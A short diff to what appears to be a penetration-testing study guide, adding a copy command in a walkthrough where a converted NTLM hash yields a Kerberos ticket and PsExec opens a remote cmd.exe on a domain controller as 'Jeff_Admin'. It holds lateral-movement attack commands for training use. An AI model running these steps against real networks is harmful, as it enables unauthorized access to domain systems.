@@ -616,6 +616,7 @@ We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any 
 Let's try that now, running ./PsExec.exe to launch cmd.exe remotely on the \dc01 machine as Jeff_Admin:
 ````
 https://github.com/EliteLoser/Invoke-PsExec/blob/master/PsExec.exe
+cp /home/kali/Downloads/PsExec.exe .
 ````
 ````
 .\PsExec.exe \\dc01 cmd.exe
